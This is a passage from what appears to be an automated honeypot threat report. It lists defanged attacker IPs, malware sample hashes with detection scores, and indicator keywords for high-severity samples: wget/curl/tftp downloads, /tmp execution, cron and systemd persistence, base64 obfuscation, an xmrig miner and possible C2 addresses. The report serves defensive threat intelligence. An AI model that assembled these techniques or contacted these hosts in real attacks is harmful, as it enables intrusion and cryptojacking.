| `117.50.89[.]196` | 1 | 2026-11-14 08:49 | 2026-11-14 08:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.136.25[.]236` | 1 | 2026-11-14 15:13 | 2026-11-14 15:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.26.229[.]104` | 1 | 2026-11-14 04:52 | 2026-11-14 04:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `121.142.204[.]4` | 1 | 2026-11-14 10:01 | 2026-11-14 10:02 | 24s | 0 | `T1592` | 🟢 LOW |
| `122.155.132[.]40` | 1 | 2026-11-14 15:00 | 2026-11-14 15:00 | 21s | 0 | `T1592` | 🟢 LOW |
| `123.129.245[.]249` | 1 | 2026-11-14 14:00 | 2026-11-14 14:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `151.243.11[.]180` | 1 | 2026-11-14 09:40 | 2026-11-14 09:40 | 3s | 0 | `T1592` | 🟢 LOW |
| `159.196.65[.]138` | 1 | 2026-11-14 05:00 | 2026-11-14 05:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `159.196.65[.]138` | 1 | 2026-11-14 15:32 | 2026-11-14 15:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `159.223.98[.]198` | 1 | 2026-11-14 09:48 | 2026-11-14 09:48 | 9s | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | 1 | 2026-11-14 09:22 | 2026-11-14 09:23 | 40s | 0 | `T1592` | 🟢 LOW |
| `168.196.246[.]112` | 1 | 2026-11-14 15:54 | 2026-11-14 15:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]229` | 1 | 2026-11-14 07:36 | 2026-11-14 07:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.239[.]55` | 1 | 2026-11-14 12:46 | 2026-11-14 12:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.203.243[.]177` | 1 | 2026-11-14 03:05 | 2026-11-14 03:05 | 30s | 0 | `T1592` | 🟢 LOW |
| `178.178.194[.]137` | 1 | 2026-11-14 05:29 | 2026-11-14 05:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | 1 | 2026-11-14 08:55 | 2026-11-14 08:55 | 9s | 0 | `T1592` | 🟢 LOW |
| `180.153.162[.]7` | 1 | 2026-11-14 11:37 | 2026-11-14 11:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `181.51.34[.]205` | 1 | 2026-11-14 09:14 | 2026-11-14 09:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `182.142.171[.]26` | 1 | 2026-11-14 06:17 | 2026-11-14 06:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.109.238[.]204` | 1 | 2026-11-14 11:59 | 2026-11-14 12:00 | 28s | 0 | `T1592` | 🟢 LOW |
| `183.167.234[.]154` | 1 | 2026-11-14 09:10 | 2026-11-14 09:10 | 11s | 0 | `T1592` | 🟢 LOW |
| `184.181.76[.]81` | 1 | 2026-11-14 08:14 | 2026-11-14 08:14 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `185.242.226[.]18` | 1 | 2026-11-14 04:54 | 2026-11-14 04:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `186.22.16[.]244` | 1 | 2026-11-14 10:42 | 2026-11-14 10:42 | 13s | 0 | `T1592` | 🟢 LOW |
| `187.44.138[.]186` | 1 | 2026-11-14 08:05 | 2026-11-14 08:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.30.245[.]66` | 1 | 2026-11-14 09:49 | 2026-11-14 09:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-14 05:28 | 2026-11-14 05:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-14 11:57 | 2026-11-14 11:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-14 15:54 | 2026-11-14 15:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]78` | 1 | 2026-11-14 13:35 | 2026-11-14 13:35 | 1s | 1 | `T1110.001` | 🟢 LOW |
| `199.165.159[.]73` | 1 | 2026-11-14 11:43 | 2026-11-14 11:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.180.1[.]198` | 1 | 2026-11-14 06:34 | 2026-11-14 06:34 | 16s | 0 | `T1592` | 🟢 LOW |
| `2.180.6[.]8` | 1 | 2026-11-14 07:51 | 2026-11-14 07:51 | 6s | 0 | `T1592` | 🟢 LOW |
| `20.118.241[.]109` | 1 | 2026-11-14 09:20 | 2026-11-14 09:20 | 10s | 0 | `T1592` | 🟢 LOW |
| `20.51.208[.]186` | 1 | 2026-11-14 12:41 | 2026-11-14 12:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.98.154[.]122` | 1 | 2026-11-14 11:27 | 2026-11-14 11:27 | 9s | 0 | `T1592` | 🟢 LOW |
| `211.220.156[.]232` | 1 | 2026-11-14 15:13 | 2026-11-14 15:13 | 1s | 0 | `T1592` | 🟢 LOW |
| `211.253.2[.]115` | 1 | 2026-11-14 14:17 | 2026-11-14 14:18 | 28s | 0 | `T1592` | 🟢 LOW |
| `211.57.28[.]143` | 1 | 2026-11-14 07:39 | 2026-11-14 07:39 | 12s | 0 | `T1592` | 🟢 LOW |
| `212.124.23[.]154` | 1 | 2026-11-14 11:24 | 2026-11-14 11:24 | 11s | 0 | `T1592` | 🟢 LOW |
| `212.70.110[.]247` | 1 | 2026-11-14 05:10 | 2026-11-14 05:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `216.226.76[.]20` | 1 | 2026-11-14 03:07 | 2026-11-14 03:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `216.226.77[.]120` | 1 | 2026-11-14 04:09 | 2026-11-14 04:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `216.226.78[.]123` | 1 | 2026-11-14 05:39 | 2026-11-14 05:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `216.249.4[.]20` | 1 | 2026-11-14 02:58 | 2026-11-14 02:59 | 16s | 0 | `T1592` | 🟢 LOW |
| `218.13.214[.]18` | 1 | 2026-11-14 03:48 | 2026-11-14 03:49 | 14s | 0 | `T1592` | 🟢 LOW |
| `218.161.77[.]158` | 1 | 2026-11-14 06:42 | 2026-11-14 06:42 | 12s | 0 | `T1592` | 🟢 LOW |
| `222.104.76[.]94` | 1 | 2026-11-14 09:16 | 2026-11-14 09:16 | 1s | 0 | `T1592` | 🟢 LOW |
| `222.186.68[.]153` | 1 | 2026-11-14 10:59 | 2026-11-14 10:59 | 23s | 0 | `T1592` | 🟢 LOW |
| `222.212.91[.]18` | 1 | 2026-11-14 09:35 | 2026-11-14 09:35 | 2s | 0 | `T1592` | 🟢 LOW |
| `222.76.248[.]54` | 1 | 2026-11-14 03:07 | 2026-11-14 03:07 | 1s | 0 | `T1592` | 🟢 LOW |
| `222.98.44[.]218` | 1 | 2026-11-14 09:14 | 2026-11-14 09:14 | 41s | 0 | `T1592` | 🟢 LOW |
| `223.100.224[.]75` | 1 | 2026-11-14 11:49 | 2026-11-14 11:49 | 14s | 0 | `T1592` | 🟢 LOW |
| `23.132.164[.]185` | 1 | 2026-11-14 13:13 | 2026-11-14 13:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | 1 | 2026-11-14 06:41 | 2026-11-14 06:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.173.0[.]140` | 1 | 2026-11-14 16:52 | 2026-11-14 16:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `31.208.252[.]51` | 1 | 2026-11-14 09:31 | 2026-11-14 09:31 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `35.206.139[.]23` | 1 | 2026-11-14 06:51 | 2026-11-14 06:51 | 2s | 0 | `T1592` | 🟢 LOW |
| `35.206.163[.]40` | 1 | 2026-11-14 03:02 | 2026-11-14 03:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.206.183[.]110` | 1 | 2026-11-14 06:51 | 2026-11-14 06:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.17[.]199` | 1 | 2026-11-14 05:00 | 2026-11-14 05:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.171[.]133` | 1 | 2026-11-14 05:22 | 2026-11-14 05:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.70[.]211` | 1 | 2026-11-14 04:47 | 2026-11-14 04:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `37.54.208[.]111` | 1 | 2026-11-14 02:55 | 2026-11-14 02:55 | 13s | 0 | `T1592` | 🟢 LOW |
| `37.79.241[.]252` | 1 | 2026-11-14 09:17 | 2026-11-14 09:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `39.104.64[.]139` | 1 | 2026-11-14 14:25 | 2026-11-14 14:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `41.212.96[.]161` | 1 | 2026-11-14 15:51 | 2026-11-14 15:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `42.0.81[.]25` | 1 | 2026-11-14 15:51 | 2026-11-14 15:52 | 25s | 0 | `T1592` | 🟢 LOW |
| `43.100.3[.]146` | 1 | 2026-11-14 07:47 | 2026-11-14 07:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `43.103.44[.]227` | 1 | 2026-11-14 07:42 | 2026-11-14 07:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-11-14 10:09 | 2026-11-14 10:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-11-14 07:09 | 2026-11-14 07:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-11-14 16:05 | 2026-11-14 16:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-11-14 07:36 | 2026-11-14 07:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]63` | 1 | 2026-11-14 03:21 | 2026-11-14 03:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.159[.]190` | 1 | 2026-11-14 13:15 | 2026-11-14 13:16 | 1s | 0 | `T1592` | 🟢 LOW |
| `50.42.73[.]47` | 1 | 2026-11-14 14:42 | 2026-11-14 14:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-11-14 03:09 | 2026-11-14 03:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.51.27[.]121` | 1 | 2026-11-14 07:59 | 2026-11-14 07:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.93.36[.]136` | 1 | 2026-11-14 07:35 | 2026-11-14 07:35 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `64.62.197[.]185` | 1 | 2026-11-14 05:59 | 2026-11-14 05:59 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]48` | 1 | 2026-11-14 05:32 | 2026-11-14 05:32 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]37` | 1 | 2026-11-14 15:57 | 2026-11-14 15:57 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]43` | 1 | 2026-11-14 11:20 | 2026-11-14 11:20 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]44` | 1 | 2026-11-14 16:35 | 2026-11-14 16:35 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]42` | 1 | 2026-11-14 16:35 | 2026-11-14 16:36 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]68` | 1 | 2026-11-14 16:35 | 2026-11-14 16:35 | 15s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-14 09:15 | 2026-11-14 09:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-14 12:54 | 2026-11-14 12:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]14` | 1 | 2026-11-14 05:31 | 2026-11-14 05:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-14 05:49 | 2026-11-14 05:49 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-14 10:18 | 2026-11-14 10:18 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-14 14:43 | 2026-11-14 14:43 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.114[.]118` | 1 | 2026-11-14 08:08 | 2026-11-14 08:08 | 1s | 0 | `T1592` | 🟢 LOW |
| `79.111.225[.]3` | 1 | 2026-11-14 13:03 | 2026-11-14 13:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `84.54.72[.]18` | 1 | 2026-11-14 03:37 | 2026-11-14 03:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]56` | 1 | 2026-11-14 13:54 | 2026-11-14 13:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]66` | 1 | 2026-11-14 04:48 | 2026-11-14 04:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.229.254[.]207` | 1 | 2026-11-14 05:44 | 2026-11-14 05:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `88.187.153[.]27` | 1 | 2026-11-14 11:53 | 2026-11-14 11:54 | 13s | 0 | `T1592` | 🟢 LOW |
| `91.236.126[.]28` | 1 | 2026-11-14 08:53 | 2026-11-14 08:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]63` | 1 | 2026-11-14 08:31 | 2026-11-14 08:31 | 14s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.118.39[.]71` | 1 | 2026-11-14 13:14 | 2026-11-14 13:14 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.253.236[.]13` | 1 | 2026-11-14 16:20 | 2026-11-14 16:20 | 11s | 0 | `T1592` | 🟢 LOW |
| `95.165.172[.]203` | 1 | 2026-11-14 03:17 | 2026-11-14 03:17 | 12s | 0 | `T1592` | 🟢 LOW |
| `95.165.84[.]70` | 1 | 2026-11-14 06:24 | 2026-11-14 06:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `95.84.137[.]185` | 1 | 2026-11-14 06:24 | 2026-11-14 06:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `95.84.137[.]185` | 1 | 2026-11-14 12:47 | 2026-11-14 12:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `98.26.192[.]121` | 1 | 2026-11-14 10:26 | 2026-11-14 10:26 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `187b67e5e2116293144f4009b1f224ed09eea924dd4ade00741a66792a63b45a` | ELF Binary (Linux executable) (x86-64 64-bit) | `187b67e5e2116293...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `18.116.101[.]220` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `2.55.126[.]88` | IL | Partner Communications Ltd. | **100** ⚠️ | 50 |
| `223.100.224[.]75` | CN | China Mobile Communications Corporation | **100** ⚠️ | 25 |
| `111.70.49[.]179` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 45 |
| `220.165.85[.]39` | CN | CHINANET yunnan province network | **100** ⚠️ | 27 |
| `13.68.214[.]34` | US | Microsoft Corporation | **100** ⚠️ | 42 |
| `93.164.134[.]141` | SE | Obenet AB | **100** ⚠️ | 2 |
| `183.109.238[.]204` | KR | Korea Telecom | **100** ⚠️ | 3 |
| `197.219.228[.]246` | MZ | Movitel, SA | **100** ⚠️ | 34 |
| `66.132.172[.]44` | US | Censys, Inc. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 386 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 375 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 122 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 23 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 21 |

---

## 🔕 False Positive Summary (56 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 10 |
| AbuseIPDB score 1 below threshold 25 | 9 |
| AbuseIPDB score 11 below threshold 25 | 2 |
| AbuseIPDB score 12 below threshold 25 | 7 |
